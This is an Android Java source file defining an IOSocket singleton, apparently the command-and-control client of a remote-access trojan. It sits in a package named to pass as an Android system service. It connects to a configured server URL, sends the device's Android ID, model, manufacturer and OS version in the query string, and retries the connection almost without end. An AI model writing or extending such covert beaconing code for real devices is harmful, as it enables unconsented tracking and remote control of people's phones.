package com.android.background.services;

import android.annotation.SuppressLint;
import android.content.Context;
import android.os.Build;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;

import java.net.URISyntaxException;

import io.socket.client.IO;
import io.socket.client.Socket;

public class IOSocket {

    private static IOSocket ourInstance;
    private Socket ioSocket;

    private IOSocket() {
        try {
            Context ctx = MainService.getContextOfApplication();
            if (ctx == null) {
                Log.e("IOSocket", "Application context is null. Cannot initialize socket.");
                return;
            }

            String deviceID = Settings.Secure.getString(
                    ctx.getContentResolver(),
                    Settings.Secure.ANDROID_ID
            );
            if (deviceID == null) deviceID = "unknown";

            String model = android.net.Uri.encode(Build.MODEL != null ? Build.MODEL : "unknown");
            String manufacturer = android.net.Uri.encode(Build.MANUFACTURER != null ? Build.MANUFACTURER : "unknown");
            String release = android.net.Uri.encode(Build.VERSION.RELEASE != null ? Build.VERSION.RELEASE : "unknown");
            String encodedId = android.net.Uri.encode(deviceID);

            IO.Options opts = new IO.Options();
            opts.reconnection = true;
            opts.reconnectionDelay = 5000;
            opts.reconnectionDelayMax = 999999999;
            opts.timeout = 30000;

            ioSocket = IO.socket(BuildConfig.SOCKET_URL
                    + "?model=" + model
                    + "&manf=" + manufacturer
                    + "&release=" + release
                    + "&id=" + encodedId);
        } catch (URISyntaxException e) {
            Log.e("IOSocket", "Invalid socket URL: " + e.getMessage());
        } catch (Exception e) {
            Log.e("IOSocket", "Failed to initialize socket: " + e.getMessage());
        }
    }

    public static synchronized IOSocket getInstance() {
        if (ourInstance == null) {
            ourInstance = new IOSocket();
        }
        return ourInstance;
    }

    public Socket getIoSocket() {
        return ioSocket;
    }

    /**
     * Reset the singleton (e.g., when URL configuration changes).
     */
    public static synchronized void reset() {
        if (ourInstance != null && ourInstance.ioSocket != null) {
            ourInstance.ioSocket.disconnect();
            ourInstance.ioSocket.off();
        }
        ourInstance = null;
    }
}
